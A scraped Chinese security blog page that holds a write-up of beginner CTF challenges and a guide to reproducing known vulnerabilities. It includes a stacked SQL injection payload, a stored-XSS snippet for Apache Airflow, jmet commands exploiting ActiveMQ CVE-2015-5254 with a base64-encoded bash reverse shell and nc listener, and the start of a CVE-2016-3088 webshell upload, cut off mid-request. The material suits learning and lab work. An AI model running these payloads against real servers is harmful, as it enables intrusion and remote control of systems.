\u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 有过滤。\n可以堆叠注入。\nflag在1919810931114514这个表里面。查询表数据的方法有两种:1.页面默认查询的是words表，需要将这两个表名互换；2.利用MySQL的预处理进行查询。\n1\u0026#39;;use supersql;set @sql=concat(\u0026#39;s\u0026#39;, \u0026#39;elect * from `1919810931114514`\u0026#39;);PREPARE pre FROM @sql;EXECUTE pre;--+ 知识点：\n1.MySQL表名为纯数字(或表名和保留字冲突时)，要加反引号，如：\nshow columns from `1919810931114514` 2.MySQL官方将prepare、execute、deallocate统称为预处理语句。\n3.字符拼接函数可以绕过关键字检查，如这里利用的concat。\nMisc reverseMe  Des：N/A。\n 给了一张图片:\n放进ps翻转图片即可。\n获得flag。\nthis_is_flag  Des：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}。\n 获得flag。\npdf  Des：菜猫给了菜狗一张图，说图下面什么都没有。\n 给了一个pdf文件，用binwalk看看。\n啥也没有，再用Acrobat软件查看pdf。\n诶，发现图片后面还有一个文本框，尝试把图片拖到一旁。\n获得flag。\ngive_you_flag  Des：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。\n 给了一个gif图片，查看后发现最后一针有一个二维码，用StegSolve逐帧看看。\n得到这一帧图片，发现缺少二维码定位点，尝试自己画上去。\n扫描二维码。\n获得flag。\ngif  Des：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机。\n 解压压缩包后获得104张图片，只有黑白两种颜色，猜测分别表示1和0？\n01100110 01101100 01100001 01100111 01111011 01000110 01110101 01001110 01011111 01100111 01101001 01000110 01111101\n然后通过python脚本转换一下：\nx = [0b01100110, 0b01101100, 0b01100001, 0b01100111, 0b01111011, 0b01000110, 0b01110101, 0b01001110, 0b01011111, 0b01100111, 0b01101001, 0b01000110, 0b01111101] flag = \u0026#39;\u0026#39; for i in x: flag += chr(i) print(flag) 获得flag。\n掀桌子  Des：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻。\n 分析给出的字符串，由0-9，a-f组成，两两分组转换成字节后均大于128，而ASCII码范围为0-127，将其减去128，python代码如下：\nx = \u0026#39;\\xc8\\xe9\\xac\\xa0\\xc6\\xf2\\xe5\\xf3\\xe8\\xc4\\xef\\xe7\\xa1\\xa0\\xd4\\xe8\\xe5\\xa0\\xe6\\xec\\xe1\\xe7\\xa0\\xe9\\xf3\\xba\\xa0\\xe8\\xea\\xfa\\xe3\\xf9\\xe4\\xea\\xfa\\xe2\\xea\\xe4\\xe3\\xea\\xeb\\xfa\\xeb\\xe3\\xf5\\xe7\\xe9\\xf3\\xe4\\xe3\\xe8\\xea\\xf9\\xea\\xf3\\xe2\\xe4\\xe6\\xf2\u0026#39; falg = \u0026#39;\u0026#39; for i in x: flag += chr(ord(i)-128) print(flag) 获得flag。\n如来十三掌  Des：菜狗为了打败菜猫，学了一套如来十三掌。\n 给了一个docx文档，用binwalk查看一下信息。\n使用命令binwalk -e分离文件。\n然后再怎么找也找不到路子做题，看了下wp，佛了。\n要用到与佛论禅进行解密。\n获得一串字符串，有点像Base64，但是解码后是乱码，想想题目，十三，尝试一下rot13。\n然后再进行Base64解码。\n获得flag。\nSimpleRAR  Des：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)。\n 只给了文件flag.txt。\n可是除了这个文件啥也没有了呀\u0026hellip;\n用WinRAR打开压缩包试试（别问为什么，问就是套路）。\n上WinHex查看数据。\nhere之后的数据应该就是那张图片了，搜索一下rar每个块的文件头：0x74。\n将高亮处改为74，保存。图片出来了。\n一片纯白，按提示用ps查看图层，但显示打开错误\u0026hellip;用binwalk看看这是什么。\n改后缀为.gif，再尝试打开。\n只有两个空白图层，将它们分别保存后用StegSolve看看。\n图层1。\n图层2。\n两张被分割的二维码，没有定位符\u0026hellip;\n唉，拼接吧。本来想用ps的图层，然而学艺不精，丢在word里面拼接之后，再用画图工具弄上定位符。\n获得flag。\n坚持60s  Des：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡。\n 这\u0026hellip;之前做过。\n使用命令binwalk -e分离文件出来，然后切换到分离目录，grep -r \u0026quot;flag\u0026quot;。\n用记事本打开包含flag的文档，搜索flag。\n里面的内容是Base64编码，解码后进行提交。\n获得flag。\nbase64stego  Des：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓。\n 题目给的压缩包里有一个加密文件，但是没有密码提示，用WinHex打开压缩包看看。\n伪加密，将高亮处改为00，保存。\n正常打开stego.txt，一大段Base64编码。\n进行Base64解码，获得一串无用字符串Steganography is the art and science of writing hidden messages in such a way that no one。\n是一道Base64隐写，附上python2.7脚本：\n获得flag。\next3  Des：今天是菜狗的生日，他收到了一个Linux系统光盘。\n 给了一个ext文件，是Linux系统文件，尝试挂载一下。此处的wsl kali由于配置环境不够，使用VMware kali虚拟机进行操作。\n挂载：mount f1fc23f5c743425d9e0073887c846d23 /mnt/。\n查找：find 'flag' /mnt/，发现有一个/mnt/O7avZhikgKgbF/flag.txt文件。\n查看：cat /mnt/O7avZhikgKgbF/flag.txt。\nBase64解码。\n获得flag。\nstegano  Des：菜狗收到了图后很开心，玩起了pdf提交格式为flag{xxx}，解密字符需小写。\n 题目给了一个pdf文件，使用浏览器打开，Ctrl+A选中所有，将文本复制到记事本。\n没有规律，尝试摩斯密码，将A替换为.，B替换为-，python代码附上：\ns = \u0026#39;BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB\u0026#39; s1 = s.replace(\u0026#39;A\u0026#39;, \u0026#39;.\u0026#39;) s2 = s.replace(\u0026#39;B\u0026#39;, \u0026#39;-\u0026#39;) print(s2) 得到一串摩斯加密，摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)，因为其他网站不是解不出来就是乱码\u0026hellip;然后对得到的字符串进行小写处理，python脚本：\ns = \u0026#39;FLAG1NV151BL3M3554G3\u0026#39; print(s.lower()) 获得flag。\n功夫再高也怕菜刀  Des：菜狗决定用菜刀和菜鸡决一死战。\n 题目给了一个后缀为.pcapng的文件，用binwalk看看。\n使用命令binwalk -e分离文件，有一个空的flag.txt文件，用Wireshark打开原始文件看看，查找flag.txt字段。\n第189个包、195个包、639个包、第641个包都一样。\n第1150个包，多了一张6666.jpg图片。\n右键第1150个包，追踪TCP数据流。\n把高亮及后面的数据进行复制，然后在WinHex里新建一个文件，粘贴过去，文件大小不要太小就行，格式选择ASCII Hex。\n然后Ctrl+S保存为jpg文件，打开后获得一个密码。\n然后我们将这个文件手动分离出来：dd if=acfff53ce3fa4e2bbe8654284dfc18e1.pcapng of=1.zip skip=1422689 bs=1。\n按密码打开压缩包里的flag.txt。\n获得flag。\nsomethin_in_image  Des：N/A。\n Erik-Baleog-and-Olaf  Des：N/A。\n binwalk分析，为png图片，改后缀，使用StegSolve查看，绿1通道发现中间有一个二维码。\n截图保存二维码，继续放入StegSolve分通道查看，得到更清楚的二维码。\nhit-the-core  Des：N/A。\n 使用strings命令查看字符串，发现这么一段内容：\ncvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}\r前几个大写字母中间都隔了4个字符，上python输出一遍：\ndata = \u0026#39;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}\u0026#39; flag = \u0026#39;\u0026#39; for i in range(3, len(data), 5): flag += data[i] print(flag) glance-50  Des：N/A。\n 一个gif图片，先看看属性。\n可知宽度明显不对，WinHex打开修改。\nCrypto flag in your hand  Des：N/A。\n base64  Des：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。。\n 给了一个txt文档，内容:Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，Base64 在线编码解码 | Base64 加密解密 - Base64.us。\n获得flag。\nCaesar  Des：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了。\n 给了一个txt文档，内容:Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)，尝试不同的位数。\n获得flag。\nMorse  Des：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)。\n txt文档内容: 。\n上脚本：\nstr = \u0026#39;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110\u0026#39; str = str.replace(\u0026#39;1\u0026#39;, \u0026#39;-\u0026#39;) str = str.replace(\u0026#39;0\u0026#39;, \u0026#39;.\u0026#39;) str = str.split(\u0026#39; \u0026#39;) dic = { # 26 个英文字符 \u0026#39;A\u0026#39;: \u0026#39;.-\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;-...\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;-.-.\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;-..\u0026#39;, \u0026#39;E\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;F\u0026#39;: \u0026#39;..-.\u0026#39;, \u0026#39;G\u0026#39;: \u0026#39;--.\u0026#39;, \u0026#39;H\u0026#39;: \u0026#39;....\u0026#39;, \u0026#39;I\u0026#39;: \u0026#39;..\u0026#39;, \u0026#39;J\u0026#39;: \u0026#39;.---\u0026#39;, \u0026#39;K\u0026#39;: \u0026#39;-.-\u0026#39;, \u0026#39;L\u0026#39;: \u0026#39;.-..\u0026#39;, \u0026#39;M\u0026#39;: \u0026#39;--\u0026#39;, \u0026#39;N\u0026#39;: \u0026#39;-.\u0026#39;, \u0026#39;O\u0026#39;: \u0026#39;---\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;.--.\u0026#39;, \u0026#39;Q\u0026#39;: \u0026#39;--.-\u0026#39;, \u0026#39;R\u0026#39;: \u0026#39;.-.\u0026#39;, \u0026#39;S\u0026#39;: \u0026#39;...\u0026#39;, \u0026#39;T\u0026#39;: \u0026#39;-\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;..-\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;...-\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;.--\u0026#39;, \u0026#39;X\u0026#39;: \u0026#39;-..-\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;-.--\u0026#39;, \u0026#39;Z\u0026#39;: \u0026#39;--..\u0026#39;, # 10 个数字 \u0026#39;0\u0026#39;: \u0026#39;-----\u0026#39;, \u0026#39;1\u0026#39;: \u0026#39;.----\u0026#39;, \u0026#39;2\u0026#39;: \u0026#39;..---\u0026#39;, \u0026#39;3\u0026#39;: \u0026#39;...--\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;....-\u0026#39;, \u0026#39;5\u0026#39;: \u0026#39;.....\u0026#39;, \u0026#39;6\u0026#39;: \u0026#39;-....\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;--...\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;---..\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;----.\u0026#39;, # 16 个特殊字符 \u0026#39;,\u0026#39;: \u0026#39;--..--\u0026#39;, \u0026#39;.\u0026#39;: \u0026#39;.-.-.-\u0026#39;, \u0026#39;:\u0026#39;: \u0026#39;---...\u0026#39;, \u0026#39;;\u0026#39;: \u0026#39;-.-.-.\u0026#39;, \u0026#39;?\u0026#39;: \u0026#39;..--..\u0026#39;, \u0026#39;=\u0026#39;: \u0026#39;-...-\u0026#39;, \u0026#34;\u0026#39;\u0026#34;: \u0026#39;.----.\u0026#39;, \u0026#39;/\u0026#39;: \u0026#39;-..-.\u0026#39;, \u0026#39;!\u0026#39;: \u0026#39;-.-.--\u0026#39;, \u0026#39;-\u0026#39;: \u0026#39;-....-\u0026#39;, \u0026#39;_\u0026#39;: \u0026#39;..--.-\u0026#39;, \u0026#39;(\u0026#39;: \u0026#39;-.--.\u0026#39;, \u0026#39;)\u0026#39;: \u0026#39;-.--.-\u0026#39;, \u0026#39;$\u0026#39;: \u0026#39;...-..-\u0026#39;, \u0026#39;\u0026amp;\u0026#39;: \u0026#39;. . . .\u0026#39;, \u0026#39;@\u0026#39;: \u0026#39;.--.-.\u0026#39; } def decode(x): flag = \u0026#39;\u0026#39; for i in x: if i == \u0026#39;\u0026#39;: flag += \u0026#39; \u0026#39; else: change = dict(map(lambda t:(t[1], t[0]), dic.items())) flag += change[i] return flag res = decode(str) print(res.lower()) 获得flag。\n不仅仅是Morse  Des：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}。\n txt文档内容：先把/符号给替换成空格 ，然后进行莫斯解密，上脚本：\n解密内容：\nHHHH之后的字母全为A和B，猜测是培根加密，在线工具|培根密码加解密 (bugku.com)：\nATTACKANDDEFENCEWORLDISINTERESTING\rattackanddefenceworldisinteresting\r获得flag。\n混合编码  Des：经过了前面那么多题目的历练，耐心细致在解题当中是必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}。\n txt内容：Base64解码：\nASCII解码：\nLzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw\rBase64解码：\n/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100\rASCII转字符：\nwelcometoattackanddefenceworld\r获得flag。\n幂数加密  Des：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}。\n txt内容：\n8842101220480224404014224202480122\r获得flag。\nRailfence  Des：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。\n txt内容：\nccehgyaefnpeoobe{lcirg}epriec_ora_g\r用栅栏解密试试，开头有一点相似，但解不出来\u0026hellip;W型栅栏加密，http://www.atoolbox.net/Tool.php?Id=777，按照提示栏数为5。\n获得flag。\neasy RSA  Des：解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}。\n txt内容：\n在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17\r求解出d\rpython脚本：\n# 分解大整数 import math # 求欧拉函数f(n) def getEuler(prime1, prime2): return (prime1-1)*(prime2-1) # 19d - 920071380k = 1 # 求私钥 d def getDkey(e, eulerValue): # 辗转相除 k = 1 while True: if (((eulerValue * k) + 1) % e) == 0: (d, m) = divmod(eulerValue * k + 1, e) return d # 避免科学计数失去精度 k += 1 # 求明文 def getPlain(c, d, n): return pow(c, d, n) if __name__ == \u0026#39;__main__\u0026#39;: p = 473398607161 q = 4511491 d = getDkey(17, getEuler(p, q)) print(d) 获得flag。\neasychallenge  Des：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。\n 题目给了一个pyc文件，需要进行反编译。在python环境配置好的基础上，pip install uncompyle进行工具安装，然后使用命令uncompyle filename进行反编译，得到如下源代码：\nimport base64 def encode1(ans): s = \u0026#39;\u0026#39; for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = \u0026#39;\u0026#39; for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = \u0026#39;\u0026#39; print \u0026#39;Please Input your flag:\u0026#39; flag = raw_input() final = \u0026#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===\u0026#39; if encode3(encode2(encode1(flag))) == final: print \u0026#39;correct\u0026#39; else: print \u0026#39;error\u0026#39; 解密脚本：\nimport base64 def decode3(ans): return base64.b32decode(ans) def decode2(ans): s = \u0026#39;\u0026#39; for i in ans: i = i ^ 36 x = i - 36 s += chr(x) return s def decode1(ans): s = \u0026#39;\u0026#39; for i in ans: i = ord(i) - 25 x = i ^ 36 s += chr(x) return s flag = \u0026#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===\u0026#39; flag = decode1(decode2(decode3(flag))) print(flag) 获得flag。\n转轮机加密  Des：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿:“嗨呀！我知道 是什么东西了！”。提示:托马斯·杰斐逊。 flag，是字符串，小写。\n 上网查询了一下转轮机加密，做题思路如下：\ntxt内容：\n先根据密钥对各行进行替换：\n然后根据密文，对第一列元素进行排列，对每行元素进行循环：\n将每一列列出来：\nDes中提到了二战，唯一读的通顺的就是\n18:FIREINTHEHOLE\r获得flag。\nNormal RSA  Des：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光。\n 方法1 给了flag.enc和pubkey.pem两个文件，分别是密文和公钥，工具：3summer/CTF-RSA-tool: a little tool help CTFer solve RSA problem (github.com)。\n命令：\n.\\solve.py --verbose -k .\\pubkey.pem --decrypt .\\flag.enc\r获得flag。\n方法2 pubkey.pem是openssl的文件类型，传统RSA公钥形式为(e,N)，用openssl解出e和N的值。kali自带openssl，使用命令 openssl rsa -pubin -text -modulus -in pubkey.pem对文件进行解析，或者RSA公私钥分解 Exponent、Modulus，Rsa公私钥指数、系数(模数)分解\u0026ndash;查错网 (chacuo.net)http://tool.chacuo.net/cryptrsakeyparse)。\n其中65537为e的值，C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD为N的十六进制值，将其转换为十进制，结果为87924348264132406875276140514499937145050893665602592992418171647042491658461。\nfactordb.com计算p值与q值。\np=275127860351348928173285174381581152299。\nq=319576316814478949870590164193048041239。\n工具下载:ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters (github.com)\npython setup.py install\npython rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239，生成一个private文件。\nopenssl rsautl -decrypt -in flag.enc -inkey private.pem.\n获得flag。\neasy ECC  Des：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用，懂了原理才能做到，小鱼你教我一下这个题怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}。\n txt内容：\n上脚本。\n获得flag。\nMobile easy-so  Des：N/A。\n Reverse insanity  Des：菜鸡觉得前面的题目太难了，来个简单的缓一下。\n 做法1 用IDA打开文件，Shift+F12。\n做法2 用记事本打开文件，搜索flag。\n获得flag。\n 本文链接：攻防世界 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/","summary":"攻防世界 Web view source  Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n 查看页面源码。\n获得flag。\nrobots  Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n 在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup  Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n 尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie  Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’\n 使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button  Des：N/A。\n 页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u0026lt;input class=\u0026#34;btn btn-default\u0026#34; disabled\u0026gt; 将此处的disabled前三字符删除，改为abled，按下按钮。\n获得flag。\nweak_auth  Des：小宁写了一个登陆验证页面，随手就设了一个密码。\n 查看源码。\n\u0026lt;from class=\u0026#34;form-inline\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;./check.php\u0026#34;\u0026gt; 有一个验证页面，访问它。\n页面空白，查看源码，提示。\n\u0026lt;!--maybe you need a dictionary--\u0026gt;\r这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确\u0026hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php  Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。\n \u0026lt;?php show_source(__FILE__); include(\u0026#34;config.php\u0026#34;); $a = @$_GET[\u0026#39;a\u0026#39;]; $b = @$_GET[\u0026#39;b\u0026#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u0026gt; 1234) { echo $flag2; } ?","title":"攻防世界"},{"content":"post ","permalink":"https://oopsdc.com/post/readme/","summary":"post ","title":""},{"content":"Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。\n影响版本 Apache Airflow 1.10.3以下版本。\n漏洞复现 访问/admin/dagrun/(默认不需要密码)。\n创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：\n\u0026lt;script\u0026gt;_a=\u0026#34;https://www.baidu.com\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location=_a\u0026lt;/script\u0026gt; 能直接造成存储型XSS。\nActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。\n影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。\n2.作为一个消息，发送给目标对应端口。\n3.访问Web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;touch /tmp/vuln\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.c.j.t.JMSTarget [main] Sent gadget \u0026#34;ROME\u0026#34; with command: \u0026#34;touch /tmp/vuln\u0026#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:\u0026lt;server-id\u0026gt; 访问http://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/admin/browse.jsp?JMSDestination=event查看消息队列，访问页面需要登录，默认账密如下：\nadmin/admin\r点击页面Message ID下的ID:server-id字段触发文件创建命令，在受害端查看命令是否执行成功：\nls /tmp 确认/tmp/vuln文件存在后即可进一步创建反弹shell。\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;/\u0026lt;port\u0026gt; 0\u0026gt;\u0026amp;1 # Base64编码 YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i} # 发送payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; # INFO如下 INFO d.c.j.t.JMSTarget [main] Connected with ID： ID：\u0026lt;server-id\u0026gt; INFO d.c.j.t.JMSTarget [main] Sent gadget \u0026#34;ROME\u0026#34; with command： \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4yMzMuNzYvODg4MyAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID：\u0026lt;server-id\u0026gt; 执行成功后，在监听端打开nc：\nnc -lvvp \u0026lt;port\u0026gt; 继续到http://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/admin/browse.jsp?JMSDestination=event页面，点击字段触发反弹shell，成功连接。\nActiveMQ 任意文件写入漏洞 CVE-2016-3088 漏洞描述 ActiveMQ中的FileServer服务允许用户通过PUT方法上传文件到指定目录。FileServer是存储文件的接口，支持写入文件（不解析jsp）、移动文件（Move）。\n影响版本 ActiveMQ 5.x ~ 5.14.0，但在5.12.x ~ 5.13.x版本中默认关闭fileserver应用(可在conf/jetty.xml中开启)。在5.14.0版本后fileserver应用被彻底删除。\n复现思路 1.PUT一个webshell到fileserver目录。\n2.若不能执行则移动webshell到有权限目录。\n漏洞复现 访问http://\u0026lt;ip\u0026gt;:8161，先登录，默认账密：\nadmin/admin\r使用bp构造如下请求包：\nPUT /fileserver/a.jsp HTTP/1.1 Host: \u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt; Cache-Control: max-age=0 Authorization: Basic 